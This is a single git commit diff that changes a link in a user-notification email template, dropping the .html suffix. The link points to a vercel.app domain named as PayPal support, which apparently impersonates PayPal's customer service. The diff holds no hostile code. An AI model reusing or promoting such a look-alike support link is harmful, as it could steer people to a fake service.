da2afd43aec0e07386bc3b5bb3e34025d2678fef
BryanViews002 <bryanjoe0012@gmail.com>
2026-06-02 15:10:54 -0700

    Enable cleanUrls to strip .html and update email link

--- api/notify-user.js
+++ api/notify-user.js
@@ -23,7 +23,7 @@ export default async function handler(req, res) {
 You have a new reply to your recent conversation.
 
 Please view the message and continue your chat here:
-https://paypalsupportservice.vercel.app/contact.html
+https://paypalsupportservice.vercel.app/contact
 
 Thank you,
 The Service Team`;
